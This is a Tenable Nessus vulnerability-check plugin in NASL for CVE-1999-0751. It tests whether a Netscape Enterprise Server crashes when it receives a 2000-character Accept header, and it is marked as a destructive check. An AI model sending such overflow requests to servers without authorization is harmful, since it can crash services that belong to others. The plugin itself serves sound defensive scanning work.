#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10154);
  script_version ("$Revision: 1.25 $");
  script_cve_id("CVE-1999-0751");
  script_bugtraq_id(631);
  script_xref(name:"OSVDB", value:"120");

  script_name(english:"Netscape Enterprise Server Accept Header Remote Overflow");
  script_summary(english:"Attmept overflow with large Accept value.");

   script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is prone to a buffer overflow.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The remote web server seems to crash when it is issued
a too long argument to the 'Accept:' command :

Example :

    GET / HTTP/1.0
    Accept: <thousands of chars>/gif

This may allow an attacker to execute arbitrary code on
the remote system.."
  );

  script_set_attribute(
    attribute:'solution',
    value: 'Upgrade to a version of Netscape Enterprise Server greater than 3.6.'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");
  script_dependencie("find_service1.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/iplanet");
  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("http_func.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

if(get_port_state(port))
{
  if(http_is_dead(port:port))exit(0);


  soc = http_open_socket(port);
 if(soc)
 {
  d = string("GET / HTTP/1.0\r\nAccept: ", crap(2000), "/gif\r\n\r\n");
  send(socket:soc, data:d);
  r = http_recv(socket:soc);
  if(!r) security_warning(port);
  http_close_socket(soc);
 }
}
